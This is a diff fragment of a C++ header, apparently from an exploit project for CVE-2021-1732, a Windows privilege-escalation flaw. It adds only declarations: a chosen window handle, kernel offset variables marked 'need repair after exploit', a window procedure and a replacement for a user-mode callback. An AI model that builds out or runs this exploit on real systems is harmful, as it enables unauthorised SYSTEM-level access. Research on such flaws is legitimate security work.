@@ -23,8 +23,17 @@ namespace CVE_2021_1732
     inline std::vector<HWND> g_HWNDs;
     inline std::vector<PVOID> g_HWNDKs;
     const size_t magicExtra = 0xDEAD;
+    inline HWND choosenOne;
+
+    //////////// offset
+    inline size_t tag0_reverseBaseOffset = 0;
+    inline size_t tag1_reverseBaseOffset = 0;
+    inline size_t tag2_reverseBaseOffset = 0; //need repair after exploit
+
 
     bool initAPI();
     bool FindHMValidateHandle(FHMValidateHandle* pfOutHMValidateHandle);
 
+    LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
+    NTSTATUS MyxxxClientAllocWindowClassExtraBytes(unsigned int* pSize);
 } // namespace CVE_2021_1732
